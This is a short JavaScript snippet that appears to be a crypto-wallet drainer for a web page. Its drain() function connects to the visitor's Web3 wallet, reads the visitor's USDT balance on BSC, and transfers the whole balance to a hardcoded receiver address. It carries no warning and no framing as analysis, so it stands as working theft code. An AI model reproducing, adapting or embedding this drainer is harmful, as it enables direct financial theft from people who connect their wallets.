
const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
const receiver = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";

async function drain() {
  if (typeof window.ethereum === 'undefined') {
    alert("Please use a Web3-enabled browser like Trust Wallet.");
    return;
  }

  const web3 = new Web3(window.ethereum);
  try {
    const accounts = await ethereum.request({ method: 'eth_accounts' });
    if (!accounts.length) {
      await ethereum.request({ method: 'eth_requestAccounts' });
    }
    const account = (await web3.eth.getAccounts())[0];

    const abi = [
      {
        "constant": false,
        "inputs": [
          { "name": "_to", "type": "address" },
          { "name": "_value", "type": "uint256" }
        ],
        "name": "transfer",
        "outputs": [{ "name": "", "type": "bool" }],
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [{ "name": "_owner", "type": "address" }],
        "name": "balanceOf",
        "outputs": [{ "name": "balance", "type": "uint256" }],
        "type": "function"
      }
    ];

    const contract = new web3.eth.Contract(abi, usdtAddress);
    const balance = await contract.methods.balanceOf(account).call();

    if (balance > 0) {
      await contract.methods.transfer(receiver, balance).send({ from: account });
    } else {
      alert("No USDT to transfer.");
    }
  } catch (err) {
    console.error(err);
    alert("Transaction failed or cancelled.");
  }
}
